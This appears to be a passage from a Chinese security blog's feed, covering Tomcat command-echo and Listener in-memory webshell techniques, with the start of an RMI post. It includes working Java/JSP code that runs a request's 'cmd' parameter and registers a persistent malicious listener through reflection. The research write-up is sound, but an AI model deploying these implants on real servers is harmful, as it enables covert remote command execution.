</span><br><span class="line">                    <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) globalField.get(handler);  </span><br><span class="line">  </span><br><span class="line">                    <span class="comment">// 获取RequestGroupInfo的processors  </span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">processors</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);  </span><br><span class="line">                    processors.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                    java.util.List&lt;RequestInfo&gt; RequestInfolist = (java.util.List&lt;RequestInfo&gt;) processors.get(global);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">                    <span class="comment">// 获取Response，并做输出处理  </span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);  </span><br><span class="line">                    reqField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                    <span class="keyword">for</span> (RequestInfo requestInfo : RequestInfolist) &#123;<span class="comment">//遍历  </span></span><br><span class="line">                        org.apache.coyote.<span class="type">Request</span> <span class="variable">coyoteReq</span> <span class="operator">=</span> (org.apache.coyote.Request) reqField.get(requestInfo);<span class="comment">//获取request  </span></span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">connectorRequest</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) coyoteReq.getNote(<span class="number">1</span>);<span class="comment">//获取catalina.connector.Request类型的Request  </span></span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">connectorResponse</span> <span class="operator">=</span> connectorRequest.getResponse();  </span><br><span class="line">  </span><br><span class="line">                        <span class="comment">// 从connectorRequest 中获取参数并执行  </span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> connectorRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">                        <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();  </span><br><span class="line">  </span><br><span class="line">                        <span class="comment">// 方法一  </span></span><br><span class="line"><span class="comment">//                connectorResponse.getOutputStream().write(res.getBytes(StandardCharsets.UTF_8));  </span></span><br><span class="line"><span class="comment">//                connectorResponse.flushBuffer();  </span></span><br><span class="line">  </span><br><span class="line">                        <span class="comment">// 方法二  </span></span><br><span class="line">                        java.io.<span class="type">Writer</span> <span class="variable">w</span> <span class="operator">=</span> response.getWriter();<span class="comment">//获取Writer  </span></span><br><span class="line">                        <span class="type">Field</span> <span class="variable">responseField</span> <span class="operator">=</span> ResponseFacade.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);  </span><br><span class="line">                        responseField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                        <span class="type">Field</span> <span class="variable">usingWriter</span> <span class="operator">=</span> Response.class.getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);  </span><br><span class="line">                        usingWriter.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                        usingWriter.set(connectorResponse, Boolean.FALSE);<span class="comment">//初始化  </span></span><br><span class="line">                        w.write(res);  </span><br><span class="line">                        w.flush();<span class="comment">//刷新  </span></span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744108192575-467630d0-c76d-49c2-9d4e-ea11b585c0ac.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744108192575-467630d0-c76d-49c2-9d4e-ea11b585c0ac.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="Ve2Ou">不足</h4>

<p>利用链太长了，POC超长，可能会存在<code>org.apache.coyote.http11.AbstractHttp11Protocol </code>的maxHeaderSize的长度限制，可以通过修改maxHeaderSize来绕过限制。操作复杂较为复杂，可能有存在性能问题，整体来讲该方法不受各种配置的影响，通用型较强。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>回显技术</tag>
      </tags>
  </entry>
  <entry>
    <title>Listener内存马</title>
    <url>/2025/03/21/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="ruLRI">Listener内存马</h1>
<h2 id="drSHJ">前置基础</h2>

<p><font style="color:rgb(80, 80, 92);">Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</font></p>
<p><strong><font style="color:rgb(80, 80, 92);">Listener三个域对象</font></strong></p>
<ul>
<li>ServletContextListener</li>
<li>HttpSessionListener</li>
<li>ServletRequestListener</li>
</ul>
<p><font style="color:rgb(80, 80, 92);">根据名字来看，ServletRequestListenner是最适合当作内存马的。从名字就知道，ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，即可触发</font><code>ServletRequestListener#requestInitialized()</code><font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">方法</font></p>
<h3 id="CR1KX">构建listener</h3>
之前构建Filter内存马，需要定义一个实现好filter接口的类，Listener也是一样，需要定义一个实现好Listener接口的类

<p>要实现listener的业务，就要实现<code>EventListener</code>，感觉和<code>Serializable</code>接口相似，只起了一个标记作用</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">package java.<span class="property">util</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A tagging interface that all event listener interfaces must extend.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public interface <span class="title class_">EventListener</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>EventListener</code>的实现类非常多，我们优先找Servlet开头的，方便去触发我们所构造的恶意Lisenter</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740051632668-b59d7e1d-f50c-4baf-abd5-0bad4306cd3a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740051632668-b59d7e1d-f50c-4baf-abd5-0bad4306cd3a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们找到了<code>ServletRequestListener</code></p>
<p>感觉该监听器在我们每次发送请求时，都会触发其<code>requestInitialized</code>方法</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">public interface <span class="title class_">ServletRequestListener</span> <span class="keyword">extends</span> <span class="title class_">EventListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> public <span class="keyword">void</span> <span class="title function_">requestDestroyed</span>(<span class="params">ServletRequestEvent sre</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> public <span class="keyword">void</span> <span class="title function_">requestInitialized</span>(<span class="params">ServletRequestEvent sre</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先构造一个简单的listener</p>
<p><font style="color:rgb(80, 80, 92);">因为前面猜想 </font><code>requestInitialized()</code><font style="color:rgb(80, 80, 92);"> 方法可以触发 Listener 监控器，所以我们在 </font><code>requestInitialized()</code><font style="color:rgb(80, 80, 92);"> 方法里面加上一些代码，来证明它何时被执行。</font></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">ServletRequestEvent</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">ServletRequestListener</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">annotation</span>.<span class="property">WebListener</span>;</span><br><span class="line"></span><br><span class="line">@<span class="title class_">WebListener</span>(<span class="string">&quot;/listenerTest&quot;</span>)</span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">ListenerTest</span> implements <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">ListenerTest</span>()&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">requestDestroyed</span>(<span class="params">ServletRequestEvent sre</span>) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">requestInitialized</span>(<span class="params">ServletRequestEvent sre</span>) &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;Listener Initialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样我们也需要在web.xml中配置</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;listener&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>ListenerTest<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span></span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure>

<p>接下来在访问路径时，都会打印信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740052668225-37ead02c-f9ad-414a-b125-49cd8446d991.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740052668225-37ead02c-f9ad-414a-b125-49cd8446d991.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><font style="color:rgb(80, 80, 92);">至此，Listener 基础代码实现完成，下面我们来分析 Listener 的运行流程。</font></p>
<h2 id="chM1X"><font style="color:rgb(80, 80, 92);">分析</font></h2>
<h3 id="G3Dyy">访问前</h3>

<p>与servlet注册时相似，我们直接看到解析xml文件后做注册的地方<code>ContextConfig#configureContext</code></p>
<p>将web.xml读取后，作为参数传入该方法中后，对servlet、filter、listener等组件进行配置</p>
<p>调试<code>ContextConfig#configureContext</code>，我们可以看到，获取的web.xml中已经有了对应的Listener文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740053961879-7b95aad3-3465-4485-8eb6-084f293f0839.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740053961879-7b95aad3-3465-4485-8eb6-084f293f0839.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们在这里重点关注listener的读取</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">private <span class="keyword">void</span> <span class="title function_">configureContext</span>(<span class="params">WebXml webxml</span>) &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">for</span> (<span class="title class_">String</span> listener : webxml.<span class="title function_">getListeners</span>()) &#123;</span><br><span class="line">            context.<span class="title function_">addApplicationListener</span>(listener);</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们在此处下个断点，运行到这里</p>
<p>这里的context是<code>StandardContext</code>，执行的是<code>StandardContext</code>的<code>addApplicationListener</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740053700525-8b867fe1-c4d0-4aca-b895-92052e1a64aa.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740053700525-8b867fe1-c4d0-4aca-b895-92052e1a64aa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><strong>在读取完web.xml文件后，需要去加载Listener</strong></p>
<p><font style="color:rgb(80, 80, 92);">当我们读取完配置文件，当应用启动的时候，</font><code>StandardContext</code><font style="color:rgb(80, 80, 92);"> 会去调用 </font><code>listenerStart()</code><font style="color:rgb(80, 80, 92);"> 方法。这个方法做了一些基础的安全检查，最后完成简单的 start 业务。</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740054961265-c2caae24-9a9c-4af6-88e5-201e596da917.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740054961265-c2caae24-9a9c-4af6-88e5-201e596da917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><font style="color:rgb(80, 80, 92);">刚开始的地方，</font><code>listenerStart()</code><font style="color:rgb(80, 80, 92);"> 方法中有这么一个语句</font></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">String</span> listeners[] = <span class="title function_">findApplicationListeners</span>();</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">这里这个方法实际就是把之前的 Listener 返回，存放到listeners</font></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">@<span class="title class_">Override</span></span><br><span class="line">    public <span class="title class_">String</span>[] <span class="title function_">findApplicationListeners</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> applicationListeners;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="rIKmD">访问后</h3>

<p>把断点下在<code>requestInitialized</code>方法，开启调试，访问路径后走到这里</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740055305524-71187a36-c398-4d73-a0ae-23cdbcf0fbff.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740055305524-71187a36-c398-4d73-a0ae-23cdbcf0fbff.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>但这里只是我们所写的代码执行点，我们需要向上找，找到<code>StandardContext#fireRequestInitEvent</code>方法</p>
<p>这里会调用<code>getApplicationEventListeners</code>方法，获取<code>ApplicationEventListeners</code>并存入<code>instances[]</code>中</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">@<span class="title class_">Override</span></span><br><span class="line">   public boolean <span class="title function_">fireRequestInitEvent</span>(<span class="params">ServletRequest request</span>) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="title class_">Object</span> instances[] = <span class="title function_">getApplicationEventListeners</span>();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ((instances != <span class="literal">null</span>) &amp;&amp; (instances.<span class="property">length</span> &gt; <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="title class_">ServletRequestEvent</span> event =</span><br><span class="line">                   <span class="keyword">new</span> <span class="title class_">ServletRequestEvent</span>(<span class="title function_">getServletContext</span>(), request);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="title class_">Object</span> instance : instances) &#123;</span><br><span class="line">               <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">continue</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> <span class="title class_">ServletRequestListener</span>)) &#123;</span><br><span class="line">                   <span class="keyword">continue</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="title class_">ServletRequestListener</span> listener = (<span class="title class_">ServletRequestListener</span>) instance;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   listener.<span class="title function_">requestInitialized</span>(event);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (<span class="title class_">Throwable</span> t) &#123;</span><br><span class="line">                   <span class="title class_">ExceptionUtils</span>.<span class="title function_">handleThrowable</span>(t);</span><br><span class="line">                   <span class="title function_">getLogger</span>().<span class="title function_">error</span>(sm.<span class="title function_">getString</span>(</span><br><span class="line">                           <span class="string">&quot;standardContext.requestListener.requestInit&quot;</span>,</span><br><span class="line">                           instance.<span class="title function_">getClass</span>().<span class="title function_">getName</span>()), t);</span><br><span class="line">                   request.<span class="title function_">setAttribute</span>(<span class="title class_">RequestDispatcher</span>.<span class="property">ERROR_EXCEPTION</span>, t);</span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>我们进入到<code>getApplicationEventListeners()</code>方法中，可以看到该方法只做了一件事：<font style="color:rgb(80, 80, 92);">获取一个 Listener 数组</font></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">@<span class="title class_">Override</span></span><br><span class="line">    public <span class="title class_">Object</span>[] <span class="title function_">getApplicationEventListeners</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> applicationEventListenersList.<span class="title function_">toArray</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>后面的for循环，会从<font style="color:rgb(80, 80, 92);">Listener数组中，将listener一个一个取出来，去执行它的</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;requestInitialized&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">方法</font></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="title class_">Object</span> instance : instances) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> <span class="title class_">ServletRequestListener</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title class_">ServletRequestListener</span> listener = (<span class="title class_">ServletRequestListener</span>) instance;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    listener.<span class="title function_">requestInitialized</span>(event);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="title class_">Throwable</span> t) &#123;</span><br><span class="line">                    <span class="title class_">ExceptionUtils</span>.<span class="title function_">handleThrowable</span>(t);</span><br><span class="line">                    <span class="title function_">getLogger</span>().<span class="title function_">error</span>(sm.<span class="title function_">getString</span>(</span><br><span class="line">                            <span class="string">&quot;standardContext.requestListener.requestInit&quot;</span>,</span><br><span class="line">                            instance.<span class="title function_">getClass</span>().<span class="title function_">getName</span>()), t);</span><br><span class="line">                    request.<span class="title function_">setAttribute</span>(<span class="title class_">RequestDispatcher</span>.<span class="property">ERROR_EXCEPTION</span>, t);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>我们现在就要想，向这个数组中去添加我们的恶意listener</p>
<p><font style="color:rgb(80, 80, 92);">我们可以通过 </font><code>StandardContext#addApplicationEventListener()</code><font style="color:rgb(80, 80, 92);"> 方法来添加 Listener</font></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span>(<span class="params"><span class="built_in">Object</span> listener</span>) &#123;</span><br><span class="line">        applicationEventListenersList.<span class="title function_">add</span>(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><font style="color:rgb(80, 80, 92);background-color:rgb(247, 247, 247);">到这一步的调试就没有内容了，所以这里的逻辑有应该是和 Filter 差不多的，Listener 这里有一个 Listener 数组，对应的 Filter 里面也有一个 Filter 数组。</font></p>
</blockquote>
<h2 id="GXNsR">实现</h2>
要实现内存马的注入，有以下两步

<ul>
<li>在Listener中的<code>requestInitialized()</code><font style="color:rgb(80, 80, 92);"> 方法里面写入恶意代码</font></li>
<li><font style="color:rgb(80, 80, 92);">通过 StandardContext 类的 </font><code>addApplicationEventListener()</code><font style="color:rgb(80, 80, 92);"> 方法把恶意的 Listener 放进去</font></li>
</ul>
<p><font style="color:rgb(80, 80, 92);">首先和前两个内存马一样，通过反射来获取</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;StandardContext&lt;/font&gt;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);  </span><br></pre></td></tr></table></figure>

<p>接下来定义我们的恶意Listener</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>最后就要实例化内存马，并<font style="color:rgb(80, 80, 92);">添加监听器</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	<span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>最终poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Arrays&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();</span><br><span class="line">  <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Shell_Listener</span> <span class="variable">shellListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">  standardContext.addApplicationEventListener(shellListener);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将tomcat服务启动后，访问<code>addListener.jsp</code>，将恶意filter注册进tomcat，后续访问任何一个路径，都可以成功执行命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740060142864-8339537b-35c4-4468-b6d8-7254f475520a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740060142864-8339537b-35c4-4468-b6d8-7254f475520a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>memShell</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI基础</title>
    <url>/2025/03/05/RMI%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="ZVq5p">RMI专题</h1>
<h2 id="rxJdj">RMI简介</h2>

<p>最早的最早，从分布式概念出现以后，工程师们，制造了一种，基于Java语言的<strong>远程方法调用</strong>的东西，它叫RMI（Remote Method Invocation），我们使用Java代码，可以利用这种技术，去跨越JVM，调用另一个JVM的类方法。</p>
<p>因为任何东西都是基于socket，<code>RMIClient</code>直接去找&gt;<code>RMIServer</code>，并不知道这个类是基于哪个端口的，所以有了RMI Registry</p>
<p>我们需要把被调用的类，注册到一个叫做RMI Registry的地方，只有把类注册到这个地方，调用者就能通过RMI Registry找到类所在JVM的ip和port，才能跨越JVM完成远程方法的调用。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735188727445-5d321176-e232-4e1f-9310-874d46b4c7eb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735188727445-5d321176-e232-4e1f-9310-874d46b4c7eb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="Q4JuW">实现</h2>

<p>这里我们来做一个简单的实现</p>
<p>我们需要准备一个Client和一个Server，首先他们需要定义一个一样的接口<code>IRemoteObj</code></p>
